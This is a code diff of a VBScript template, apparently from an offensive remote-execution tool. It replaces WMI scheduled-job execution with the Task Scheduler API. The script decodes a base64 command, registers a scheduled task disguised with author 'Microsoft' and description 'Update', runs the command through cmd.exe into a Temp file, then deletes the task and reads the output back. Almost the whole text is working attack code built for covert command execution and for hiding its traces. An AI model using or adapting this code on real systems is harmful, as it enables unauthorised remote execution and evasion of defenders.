@@ -1,16 +1,12 @@
-Dim time_zone
-Dim exec_time
-Dim results_save
 Dim command
-results_save = "C:\Windows\Temp\REPLACE_WITH_FILENAME"
-command = "c:\windows\system32\cmd.exe /c "& Base64StringDecode("REPLACE_WITH_COMMAND") &" 1> " & results_save & " 2>&1"
+command = Base64StringDecode("REPLACE_WITH_COMMAND")
 
-' Avoid execute command duplicated
-If FileExists(results_save) Then
+If FileExists("C:\Windows\Temp\REPLACE_WITH_FILENAME") Then
+    inputFile = "C:\Windows\Temp\REPLACE_WITH_FILENAME"
     Set inStream = CreateObject("ADODB.Stream")
     inStream.Open
     inStream.type= 1 'TypeBinary
-    inStream.LoadFromFile(results_save)
+    inStream.LoadFromFile(inputFile)
     readBytes = inStream.Read()
 
     Set oXML = CreateObject("Msxml2.DOMDocument")
@@ -32,7 +28,41 @@ If FileExists(results_save) Then
     Else
     End If
 Else
-	AddJobWithRes
+    Const TriggerTypeDaily = 1
+    Const ActionTypeExec = 0
+    Set service = CreateObject("Schedule.Service")
+    Call service.Connect
+    Dim rootFolder
+    Set rootFolder = service.GetFolder("\")
+    Dim taskDefinition
+    Set taskDefinition = service.NewTask(0)
+    Dim regInfo
+    Set regInfo = taskDefinition.RegistrationInfo
+    regInfo.Description = "Update"
+    regInfo.Author = "Microsoft"
+    Dim settings
+    Set settings = taskDefinition.settings
+    settings.Enabled = True
+    settings.StartWhenAvailable = True
+    settings.Hidden = False
+    settings.DisallowStartIfOnBatteries = False
+    Dim triggers
+    Set triggers = taskDefinition.triggers
+    Dim trigger
+    Set trigger = triggers.Create(7)
+    Dim Action
+    Set Action = taskDefinition.Actions.Create(ActionTypeExec)
+    Action.Path = "c:\windows\system32\cmd.exe"
+    Action.arguments = "/c cd /d REPLACE_WITH_CWD & echo [COMMAND] > C:\Windows\Temp\REPLACE_WITH_FILENAME & " & command & " 1>> C:\Windows\Temp\REPLACE_WITH_FILENAME 2>&1 & echo [PATH] >> C:\Windows\Temp\REPLACE_WITH_FILENAME & cd >> C:\Windows\Temp\REPLACE_WITH_FILENAME"
+    Dim objNet, LoginUser
+    Set objNet = CreateObject("WScript.Network")
+    LoginUser = objNet.UserName
+    If UCase(LoginUser) = "SYSTEM" Then
+    Else
+    LoginUser = Empty
+    End If
+    Call rootFolder.RegisterTaskDefinition("REPLACE_WITH_TASK", taskDefinition, 6, LoginUser, , 3)
+    Call rootFolder.DeleteTask("REPLACE_WITH_TASK",0)
 End If
 
 Function FileExists(FilePath)
@@ -42,49 +72,6 @@ Function FileExists(FilePath)
     Else
         FileExists=CBool(0)
     End If
-End Function
-
-Function GetTime()
-    wbemCimtypeString = 8
-    Set objSWbemService = GetObject("Winmgmts:root\cimv2")
-    Set colItems = objSWbemService.ExecQuery("SELECT * FROM Win32_TimeZone", "WQL", wbemFlagReturnImmediately + wbemFlagForwardOnly )
-    For Each objItem In colItems
-        time_zone = objItem.Bias
-		if time_zone > 0 Then
-			time_zone = "+" & time_zone
-		End IF
-    Next
-	
-	' Delay one minute
-	Dim tmp_time
-	tmp_time = DateAdd("n",1,Now())
-	exec_time = hour(tmp_time)*100 + minute(tmp_time)
-End Function
-
-Function AddJobWithRes()
-	GetTime()
-	Set objSWbemService = GetObject("Winmgmts:root\cimv2")
-    exec_time = "********"&exec_time&"00.000000"&time_zone
-    Set objNewJob = objSWbemService.Get("Win32_ScheduledJob")
-    errJobCreated = objNewJob.Create(command, exec_time, True , , , True, JobId)
-    If errJobCreated <> 0 Then
-        wbemCimtypeString = 8
-        Set objClass = GetObject("Winmgmts:root\cimv2:REPLACE_WITH_CLASSNAME")
-        Set objInstance = objClass.spawninstance_
-        objInstance.CreationClassName = "RELEACE_WITH_UUID"
-		' "Create job error"
-        objInstance.DebugOptions = "Q3JlYXRlIGpvYiBlcnJvcg=="
-        objInstance.put_
-    Else
-	End If
-	Dim done
-	done = false
-	Do Until done
-		Wscript.Sleep 2000
-		If FileExists(results_save) Then
-			done = true
-		End If
-	loop
 End Function
 
 Function Base64StringDecode(ByVal vCode)
